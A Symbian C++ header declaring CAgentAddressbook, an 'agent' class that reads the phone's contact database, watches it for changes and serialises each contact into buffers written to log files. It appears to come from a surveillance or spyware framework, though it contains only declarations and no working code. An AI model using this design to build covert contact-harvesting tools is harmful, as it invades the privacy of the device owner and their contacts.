/*
 ============================================================================
 Name		: AgentAddressbook.h
 Author	  : Marco Bellino
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CAgentAddressbook declaration
 ============================================================================
 */

#ifndef AGENTADDRESSBOOK_H
#define AGENTADDRESSBOOK_H

// INCLUDES
#include <e32std.h>
#include <e32base.h>

#include <HT\Logging.h>
#include <HT\LongRunTask.h>
#include <CNTDB.H>   
#include <CNTDBOBS.H>      // for MContactDbObserver
#include <CNTFILT.H>       // for CCntFilter


#include "AbstractAgent.h"
// CLASS DECLARATION


/**
 *  CAgentAddressbook
 * 
 */
class CAgentAddressbook : public CAbstractAgent, public MLongTaskCallBack, public MContactDbObserver
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CAgentAddressbook();

	/**
	 * Two-phased constructor.
	 */
	static CAgentAddressbook* NewL(const TDesC8& params);

	/**
	 * Two-phased constructor.
	 */
	static CAgentAddressbook* NewLC(const TDesC8& params);
	
	/**
	 * From MContactDbObserver
	 */
	virtual void HandleDatabaseEventL(TContactDbObserverEvent aEvent);

protected:
	// From CAbstractQueueEndPoint
	virtual void StartAgentCmdL();
	virtual void StopAgentCmdL();

private:
	/**
	 * Gets the Type of the Item Field
	 */
	TInt GetTypeFromItemField(const CContactItemField& aField);
	
	/**
	 * Read the field and return it as a buffer
	 */
	HBufC* ReadFieldAsTextL(const CContactItemField& itemField);
	
	/**
	 * Check if the Entry contains some Empty Fields (it means it is not a valid entry)
	 */
	TBool ContainsEmptyField(const CContactItemFieldSet& fields);

	/**
	 * Transform the information contained in the item in a buffer.
	 * @return The buffer in proper format, ready to be written in the file.
	 */
	HBufC8* GetContactBufferL(const CContactItem& item);

	/**
	 * Transform the information contained in the item in a buffer.
	 * @return The buffer in proper format, ready to be written in the file.
	 */
	HBufC8* GetTTimeBufferL(const TTime aTime);

	
	// from MLongTaskCallBack
	virtual void DoOneRoundL();
	
	/**
	 * Constructor for performing 1st stage construction
	 */
	CAgentAddressbook();

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL(const TDesC8& params);

private:
	CLongTaskAO* iLongTask;
	TBool iStopLongTask;
	CContactDatabase* iContDb;
	CContactIdArray* iContacts;	// not owned  //TODO: delete, this is no more true
	CCntFilter* iFilter;
	
	TInt iContactIndex;
	
	CContactChangeNotifier* iDbNotifier;
	
	TTime iTimestamp;		// used for markup
	CLogFile* iMarkupFile;
	
	__FLOG_DECLARATION_MEMBER
	};

#endif // AGENTAddressbook_H
